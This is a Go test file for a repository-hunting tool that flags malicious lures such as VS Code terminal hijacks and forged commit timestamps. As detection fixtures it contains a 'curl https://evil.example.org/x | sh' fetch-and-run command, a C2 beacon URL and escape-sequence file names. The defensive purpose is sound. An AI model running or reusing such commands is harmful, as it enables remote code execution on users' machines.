package main

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"skarvel/internal/bbapi"
	"skarvel/internal/criteria"
	"skarvel/internal/graph"
	"skarvel/internal/indicator"
)

func TestParseArgsDefaultsToGitHub(t *testing.T) {
	c, err := parseArgs([]string{"--ioc", "codeprettier.pro"})
	if err != nil {
		t.Fatal(err)
	}
	if c.platform != criteria.HostGitHub || len(c.iocs) != 1 || len(c.workspaces) != 0 {
		t.Fatalf("got %+v", c)
	}
}

func TestParseArgsBitbucketUsesBuiltinWorkspaces(t *testing.T) {
	c, err := parseArgs([]string{"--ioc=x.example", "--platform", "bitbucket", "--workspace", "acme"})
	if err != nil {
		t.Fatal(err)
	}
	if c.platform != criteria.HostBitbucket {
		t.Fatalf("platform = %q", c.platform)
	}
	if strings.Join(c.workspaces, ",") != "bloxbits,acme" {
		t.Fatalf("workspaces = %v", c.workspaces)
	}
}

func TestParseArgsRejects(t *testing.T) {
	for _, args := range [][]string{
		{},
		{"--ioc", ""},
		{"--ioc"},
		{"--ioc", "x", "--platform", "gitlab"},
		{"--ioc", "x", "--workspace", "w"},
		{"--ioc", "x", "--max-depth", "3"},
	} {
		if _, err := parseArgs(args); err == nil {
			t.Errorf("parseArgs(%q) accepted", args)
		}
	}
}

func TestParseArgsRepo(t *testing.T) {
	for _, tc := range []struct {
		args     []string
		repo     string
		platform string
		iocs     int
	}{
		{[]string{"--repo", "octo/cat"}, "octo/cat", criteria.HostGitHub, 0},
		{[]string{"-r", "octo/cat", "--ioc", "x.example"}, "octo/cat", criteria.HostGitHub, 1},
		{[]string{"--repo=https://github.com/octo/cat.git"}, "octo/cat", criteria.HostGitHub, 0},
		{[]string{"-r", "https://github.com/octo/cat/tree/main"}, "octo/cat", criteria.HostGitHub, 0},
		{[]string{"-r", "https://bitbucket.org/acme/proj"}, "acme/proj", criteria.HostBitbucket, 0},
		{[]string{"-r", "acme/proj", "--platform", "bitbucket"}, "acme/proj", criteria.HostBitbucket, 0},
	} {
		c, err := parseArgs(tc.args)
		if err != nil {
			t.Fatalf("parseArgs(%q): %v", tc.args, err)
		}
		if c.repo != tc.repo || c.platform != tc.platform || len(c.iocs) != tc.iocs {
			t.Errorf("parseArgs(%q) = %+v", tc.args, c)
		}
	}
	c, _ := parseArgs([]string{"-r", "acme/proj", "--platform", "bitbucket"})
	if strings.Join(c.workspaces, ",") != "acme" {
		t.Errorf("bitbucket repo mode workspaces = %v, want only the repo's owner", c.workspaces)
	}
}

func TestParseArgsRepoRejects(t *testing.T) {
	for _, args := range [][]string{
		{"--repo"},
		{"--repo", "justaname"},
		{"--repo", "a/b/c"},
		{"--repo", "https://gitlab.com/a/b"},
		{"--repo", "https://github.com/a/b", "--platform", "bitbucket"},
		{"--repo", "a/b", "--repo", "c/d"},
		{"--repo", "a/b", "--workspace", "w", "--platform", "bitbucket"},
		{"--repo", "a/../b"},
		{"--repo", "a/b c"},
	} {
		if _, err := parseArgs(args); err == nil {
			t.Errorf("parseArgs(%q) accepted", args)
		}
	}
}

func node(key string, examined bool, v criteria.Verdict, fs ...criteria.Finding) graph.Node {
	return graph.Node{Kind: graph.KindRepo, Key: key, Visited: examined, Examined: examined, Verdict: v, Findings: fs}
}

// Each listed repository should say why it is there, how the crawl found it,
// and, for every file, which signals fired, what matched and where to read it.
func TestReportExplainsEachRepository(t *testing.T) {
	seed := graph.Node{Kind: graph.KindIndicator, Key: "evil.example.org", Reason: "seed"}
	// The search index reports the hit first and without a line number; the
	// clone then reports the same file with a line and a commit.
	indexHit := criteria.Finding{
		Signal: "indicator-code-search", Tier: criteria.TierA, Repo: "op/lure",
		Path: ".vscode/settings.json", Evidence: "evil.example.org", Host: criteria.HostGitHub,
	}
	cloneHit := criteria.Finding{
		Signal: "indicator-domain", Tier: criteria.TierA, Repo: "op/lure",
		Path: ".vscode/settings.json", Line: 3, SHA: "abc123",
		Evidence: `"command": "curl https://evil.example.org/x | sh"`, Host: criteria.HostGitHub,
	}
	hijack := criteria.Finding{
		Signal: "vscode-terminal-hijack", Tier: criteria.TierB, Repo: "op/lure",
		Path: ".vscode/settings.json", Line: 3, SHA: "abc123", Host: criteria.HostGitHub,
	}
	// A matched secret is a credential: its text must never reach the report.
	secret := criteria.Finding{
		Signal: "indicator-secret", Tier: criteria.TierA, Repo: "op/lure",
		Path: "server/auth.js", Line: 9, SHA: "abc123", Host: criteria.HostGitHub,
		Evidence: "const k = 'SuperStr0ngSecret@)@^'",
	}
	// Forged-history findings: the statistic is reported, the persona is not.
	stamps := criteria.Finding{
		Signal: "forged-timestamps", Tier: criteria.TierB, Subject: criteria.SubjectRepo, Repo: "op/lure",
		Evidence: "150 of 200 commits on the hour (p=1e-400, 0 bot commits excluded)",
	}
	persona := criteria.Finding{
		Signal: "forged-persona", Tier: criteria.TierC, Subject: criteria.SubjectIdentity, Repo: "op/lure",
		Identity: "Real Dev <real@dev.example>", Evidence: "30 of 30 commits on the hour",
	}
	repo := node("op/lure", true, criteria.VerdictMalicious, indexHit, cloneHit, hijack, secret, stamps, persona)
	repo.From, repo.Reason = graph.ID(graph.KindIndicator, "evil.example.org"), "indicator-match"

	r := classify([]graph.Node{seed, repo}, criteria.HostGitHub)
	out := render(r, nil, summary{})

	for _, want := range []string{
		"why   MALICIOUS · 3 definitive signal(s)",
		"via   indicator evil.example.org ─[indicator-match]→ this repository",
		"clock 150 of 200 commits on the hour (p=1e-400, 0 bot commits excluded)",
		"A indicator-code-search · A indicator-domain · B vscode-terminal-hijack",
		// the clone's line and commit replaced the index hit's bare link
		"↳ https://github.com/op/lure/blob/abc123/.vscode/settings.json#L3",
		`match "command": "curl https://evil.example.org/x | sh"`,
		"/server/auth.js",
		"A indicator-secret",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("report missing %q:\n%s", want, out)
		}
	}
	for _, leaked := range []string{"SuperStr0ngSecret", "Real Dev", "real@dev.example"} {
		if strings.Contains(out, leaked) {
			t.Errorf("report leaked %q:\n%s", leaked, out)
		}
	}
	// The same body is drawn in colour, so the screen cannot disagree with the file.
	pretty := visible(renderPretty(palette{on: true}, r, nil, summary{}, 100))
	for _, want := range []string{"why   MALICIOUS", "via   indicator evil.example.org", "↳ https://github.com/op/lure/blob/abc123/"} {
		if !strings.Contains(pretty, want) {
			t.Errorf("colour report missing %q:\n%s", want, pretty)
		}
	}
}

// Mined indicators are the hunt's own output: the report must name them, not
// just count them.
func TestReportListsMinedIndicators(t *testing.T) {
	promoted := []indicator.Indicator{
		{Value: "https://c2.evil-host.io/beacon", Kind: indicator.KindURL, Source: "op/lure:src/a.js"},
		{Value: "SuperStr0ngSecret@)@^", Kind: indicator.KindSecret, Source: "op/lure:src/a.js"},
	}
	var candidates []indicator.Indicator
	for i := 0; i < maxCandidates+7; i++ {
		candidates = append(candidates, indicator.Indicator{
			Value: "host" + string(rune('a'+i%26)) + string(rune('a'+i/26)) + ".example.io",
			Kind:  indicator.KindDomain, Source: "dev/x:b.js",
		})
	}
	candidates = append(candidates,
		indicator.Indicator{Value: "processUserData", Kind: indicator.KindGeneric, Source: "dev/x:b.js"},
		indicator.Indicator{Value: "203.0.113.9:8080", Kind: indicator.KindIP, Source: "dev/x:b.js"})

	var r results
	r.setIndicators(promoted, candidates)
	out := render(r, nil, summary{})

	for _, want := range []string{
		"═══ 2 NEW IOCs · mined from confirmed payloads",
		"hxxps://c2.evil-host.io/beacon", // defanged: never a live link
		"from op/lure:src/a.js",
		"═══ 29 IOC CANDIDATES · held for review, not searched",
		"… 9 more not shown",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("report missing %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "https://c2.evil-host.io") {
		t.Error("a mined URL must be defanged in the report")
	}
	if strings.Contains(out, "SuperStr0ngSecret") {
		t.Error("a mined secret must be masked in the report")
	}
	if !strings.Contains(out, "Su…(21 chars, masked)") {
		t.Errorf("masked secret missing:\n%s", out)
	}
	// Most specific first: the IP precedes every domain, and the bare string is last.
	ip, firstDomain, generic := strings.Index(out, "203.0.113.9"), strings.Index(out, "hosta"), strings.Index(out, "processUserData")
	if ip < 0 || firstDomain < 0 || ip > firstDomain {
		t.Errorf("an address should be listed before domains (ip %d, domain %d)", ip, firstDomain)
	}
	if generic >= 0 && generic < firstDomain {
		t.Error("a generic string should be listed after domains")
	}
	if got := strings.Count(out, "from dev/x:b.js"); got != maxCandidates {
		t.Errorf("candidate rows = %d, want the cap of %d", got, maxCandidates)
	}
}

func TestReportSaysWhenNothingWasMined(t *testing.T) {
	out := render(results{}, nil, summary{})
	if !strings.Contains(out, "═══ 0 NEW IOCs · nothing new was mined from confirmed payloads") {
		t.Errorf("an empty IOC section should say so:\n%s", out)
	}
	if strings.Contains(out, "CANDIDATE") {
		t.Error("no candidate section when there are no candidates")
	}
}

// A repository controls its own file names, and git allows ESC and newline in
// one. Whatever the report prints -- to the file, to a pipe, or in colour --
// must not carry them through to the analyst's terminal.
func TestReportNeutralisesHostileNames(t *testing.T) {
	hostile := "\x1b]0;pwned\x07/.vscode/\x1b[2Jsettings.json\nFORGED LINE"
	n := node("evil/lure", true, criteria.VerdictMalicious,
		criteria.Finding{Signal: "s", Tier: criteria.TierA, Path: hostile})
	r := classify([]graph.Node{n}, criteria.HostGitHub)
	if len(r.Malicious) != 1 || len(r.Malicious[0].Paths) != 1 {
		t.Fatalf("results = %+v", r)
	}

	warn := "search failed: \x1b[31mred\x1b[0m\nsecond line"
	plain := render(r, []string{warn}, summary{IOCs: []string{"x\x1b[1my"}})
	pretty := renderPretty(palette{on: false}, r, []string{warn}, summary{IOCs: []string{"x\x1b[1my"}}, 80)
	for name, out := range map[string]string{"render": plain, "renderPretty": pretty} {
		if strings.ContainsAny(out, "\x1b\x07") {
			t.Errorf("%s leaked a control character: %q", name, out)
		}
		// The injected newline must not start a line of its own, or a hostile
		// file name could forge report lines.
		if strings.Contains(out, "\nFORGED LINE") {
			t.Errorf("%s let a file name forge a report line:\n%s", name, out)
		}
	}
	if !strings.Contains(plain, "settings.json") {
		t.Errorf("sanitising must keep the readable part of the path:\n%s", plain)
	}
}

func TestClassifyAndRender(t *testing.T) {
	file := func(path string, tier criteria.Tier) criteria.Finding {
		return criteria.Finding{Signal: "s", Tier: tier, Path: path}
	}
	lead := node("lead/repo", true, criteria.VerdictMalicious, file(".vscode/settings.json", criteria.TierA))
	lead.Lead = true
	corpus := node("intel/feed", true, criteria.VerdictMalicious, file("iocs.csv", criteria.TierA))
	corpus.Corpus = true

	nodes := []graph.Node{
		node("op/lure", true, criteria.VerdictMalicious,
			file(".vscode/settings.json", criteria.TierA),
			file("backend/src/compliance/complianceService.js", criteria.TierB),
			file(".vscode/settings.json", criteria.TierC)),
		node("dev/review", true, criteria.VerdictReview, file("scripts/setup.sh", criteria.TierB)),
		node("idx/hit", false, criteria.VerdictMalicious, file("src/a.js", criteria.TierA)),
		node("gen/history", true, criteria.VerdictClean,
			criteria.Finding{Signal: "forged-timestamps", Tier: criteria.TierC}),
		node("plain/clean", true, criteria.VerdictClean),
		lead, corpus,
		{Kind: graph.KindIdentity, Key: "someone <a@b>"},
	}

	r := classify(nodes, criteria.HostGitHub)
	if len(r.Malicious) != 1 || r.Malicious[0].URL != "https://github.com/op/lure" {
		t.Fatalf("malicious = %+v", r.Malicious)
	}
	if got := strings.Join(r.Malicious[0].Paths, ","); got != "/.vscode/settings.json,/backend/src/compliance/complianceService.js" {
		t.Errorf("paths = %s", got)
	}
	var verify []string
	for _, v := range r.Verify {
		verify = append(verify, v.URL)
	}
	want := "https://github.com/dev/review https://github.com/idx/hit https://github.com/gen/history https://github.com/lead/repo"
	if strings.Join(verify, " ") != want {
		t.Errorf("verify = %v", verify)
	}

	out := render(r, nil, summary{})
	for _, s := range []string{
		"═══ 1 MALICIOUS · repository confirmed",
		"● https://github.com/op/lure\n" +
			"      why   MALICIOUS · 1 definitive signal(s)\n" +
			"      ├─ /.vscode/settings.json\n" +
			"      │     A s\n" +
			"      └─ /backend/src/compliance/complianceService.js\n" +
			"            B s\n",
		"═══ 4 TO VERIFY · repositories with weaker or unconfirmed signals",
		"● https://github.com/dev/review\n      why   REVIEW · 1 strong signal\n",
		"● https://github.com/idx/hit\n      why   search-index hit only; the repository was not cloned\n",
		"● https://github.com/gen/history  [forged commit timestamps]\n      why   the only signal is forged commit timestamps\n",
		"● https://github.com/lead/repo\n      why   rated MALICIOUS, but reached only through an identity lead\n",
	} {
		if !strings.Contains(out, s) {
			t.Errorf("render missing %q:\n%s", s, out)
		}
	}
	if strings.Contains(out, "intel/feed") || strings.Contains(out, "plain/clean") || strings.Contains(out, "someone") {
		t.Errorf("render leaked corpus/clean/identity:\n%s", out)
	}
	if !strings.Contains(render(r, []string{"7 search(es) failed"}, summary{}), "[!] 7 search(es) failed") {
		t.Error("warning not rendered")
	}
}

func TestBitbucketURLs(t *testing.T) {
	r := classify([]graph.Node{node("bloxbits/stockx_v1", true, criteria.VerdictMalicious,
		criteria.Finding{Tier: criteria.TierA, Path: ".vscode/settings.json"})}, criteria.HostBitbucket)
	if r.Malicious[0].URL != "https://bitbucket.org/bloxbits/stockx_v1" {
		t.Fatalf("url = %s", r.Malicious[0].URL)
	}
}

func TestOutputFile(t *testing.T) {
	ts := time.Date(2026, 10, 6, 17, 15, 0, 0, time.Local)
	if got := outputName(ts); got != "skarvel_output_20261006_171500.txt" {
		t.Fatalf("outputName = %s", got)
	}
	if !regexp.MustCompile(`^skarvel_output_\d{8}_\d{6}\.txt$`).MatchString(outputName(time.Now())) {
		t.Fatal("name not filesystem-safe")
	}

	dir := t.TempDir()
	wd, _ := os.Getwd()
	defer os.Chdir(wd)
	os.Chdir(dir)

	a, err := writeOutput(ts, "one")
	if err != nil {
		t.Fatal(err)
	}
	b, err := writeOutput(ts, "two")
	if err != nil {
		t.Fatal(err)
	}
	if a == b {
		t.Fatal("second run overwrote the first")
	}
	got, _ := os.ReadFile(filepath.Join(dir, a))
	if string(got) != "one" {
		t.Fatalf("content = %q", got)
	}
}

func TestAccountTokenHelpNamesTheCause(t *testing.T) {
	if got := accountTokenHelp(bbapi.Auth{Token: "ATATTsecret"}); !strings.Contains(got, "BITBUCKET_USER is not set") || strings.Contains(got, "secret") {
		t.Errorf("no user:\n%s", got)
	}
	got := accountTokenHelp(bbapi.Auth{Token: "ATATTsecret", User: "me@example.com", AppPassword: "pass"})
	if !strings.Contains(got, "unset BITBUCKET_APP_PASSWORD") || strings.Contains(got, "secret") || strings.Contains(got, "pass\n") {
		t.Errorf("leftover password:\n%s", got)
	}
}

// A repository whose own README warns that it holds malicious code is a research
// or victim copy: it keeps its evidence but must not be listed as MALICIOUS.
func TestWarnedRepositoryIsNotReportedMalicious(t *testing.T) {
	file := func(path string, tier criteria.Tier) criteria.Finding {
		return criteria.Finding{
			Signal: "vscode-terminal-hijack", Tier: tier, Subject: criteria.SubjectFile,
			Path: path, Evidence: "curl https://evil.example/x | sh", Host: criteria.HostGitHub,
		}
	}
	copyRepo := node("res/real-world-assets", true, criteria.VerdictMalicious,
		file(".vscode/settings.json", criteria.TierA))
	copyRepo.Warned = true
	copyRepo.WarnReason = "THIS REPO CONTAINS MALICIOS CODE ... DO NOT DOWNLOAD OR RUN"
	lure := node("op/lure", true, criteria.VerdictMalicious,
		file(".vscode/settings.json", criteria.TierA))

	r := classify([]graph.Node{copyRepo, lure}, criteria.HostGitHub)
	if len(r.Malicious) != 1 || !strings.HasSuffix(r.Malicious[0].URL, "op/lure") {
		t.Fatalf("Malicious = %+v, want only op/lure", r.Malicious)
	}
	if len(r.Warned) != 1 || !strings.HasSuffix(r.Warned[0].URL, "res/real-world-assets") {
		t.Fatalf("Warned = %+v, want res/real-world-assets", r.Warned)
	}
	out := render(r, nil, summary{})
	if !strings.Contains(out, "SELF-DECLARED") || !strings.Contains(out, "DO NOT DOWNLOAD") {
		t.Errorf("report should list the self-declared repository with the owner's words:\n%s", out)
	}
}
